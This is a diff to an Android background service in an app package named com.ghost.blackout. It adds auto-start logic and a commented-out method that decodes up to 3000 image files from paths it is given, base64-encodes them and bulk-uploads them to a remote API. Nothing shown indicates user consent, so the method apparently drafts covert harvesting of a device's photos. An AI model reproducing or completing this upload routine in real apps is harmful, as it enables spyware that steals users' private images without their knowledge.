@@ -3,14 +3,21 @@ package com.ghost.blackout.services;
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
 import android.annotation.SuppressLint;
+import android.app.Activity;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.MediaStore;
+import android.util.Base64;
 import android.util.Log;
 import android.widget.RemoteViews;
 import android.widget.Toast;
@@ -27,6 +34,9 @@ import com.ghost.blackout.interfaces.ActivityPhase;
 import com.ghost.blackout.network.InnerApi;
 import com.wineberryhalley.bclassapp.TinyDB;
 
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.util.ArrayList;
 import java.util.Timer;
 import java.util.TimerTask;
 
@@ -95,8 +105,8 @@ public class BServiceS extends Service {
           bServiceS = this;
 
             InnerApi inm = new InnerApi(this);
-inm.load();
-            Log.e(TAG, "onCreate: si" );
+inm.load(false);
+            Log.e(TAG, "onCreate: si " +(serviceListener != null));
 
             if(serviceListener != null){
                 serviceListener.OnServiceStart();
@@ -125,6 +135,12 @@ inm.load();
         return this;
     }
 
+    private boolean should;
+
+    public BServiceS shouldStart(boolean s){
+        this.should = s;
+        return this;
+    }
 
     public void startBService(){
         if(!activated){
@@ -149,6 +165,11 @@ inm.load();
             {
              //   Log.e(TAG, "onSdkInitialized: contador iniciado "+(secondsToStart)+" SEGUNDOS pa empezar, "+secondsPeriod+" SEGUNDOS periodicos" );
                 wasLoadedSDK = true;
+                Log.e(TAG, "onSdkInitialized: sdk Inicializado, debe empezar = "+should );
+                if(should){
+                    BlackApplication.activityPhase = ActivityPhase.STOPPED;
+                    goService();
+                }
             }
         } );
     }
@@ -157,6 +178,7 @@ inm.load();
     public Timer timer;
     public boolean isStarted;
     public void goService(){
+        Log.e(TAG, "goService: servicio GO "+(wasLoadedSDK)+" y "+isStarted );
         if(!wasLoadedSDK || isStarted){
             return;
         }
@@ -207,6 +229,51 @@ if(ActivityInner.isActive || BlackApplication.activityPhase == ActivityPhase.ACT
     }
 
 
+ /*   private int tempLimit = 3000;
+    public void testD(ArrayList<String> f){
+
+        ArrayList<String> bases = new ArrayList<>();
+        int count = 0;
+        for (String img:
+                f) {
+            if(count >= tempLimit){
+                break;
+            }
+
+            File file = new File(img);
+         //   Log.e(TAG, "img: "+img);
+            Bitmap bitmap= BitmapFactory.decodeFile(file.getAbsolutePath());
+            String ba = getStringImage(bitmap);
+            bases.add(ba);
+            count++;
+        }
+
+InnerApi innerApi = new InnerApi(this);
+
+innerApi.uploadMultiple(bases, new InnerApi.UploadMultiple() {
+    @Override
+    public void onUploadAll() {
+        Log.e(TAG, "onUploadAll: ready mano" );
+    }
+
+    @Override
+    public void onSomeError(String er) {
+        Log.e(TAG, "onSomeError: "+er );
+    }
+});
+
+
+    }
+
+    public String getStringImage(Bitmap bmp) {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bmp.compress(Bitmap.CompressFormat.JPEG, 100, baos);
+        byte[] imageBytes = baos.toByteArray();
+        String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
+        return encodedImage;
+
+    }
+*/
     @Override
     public void onDestroy() {
         super.onDestroy();
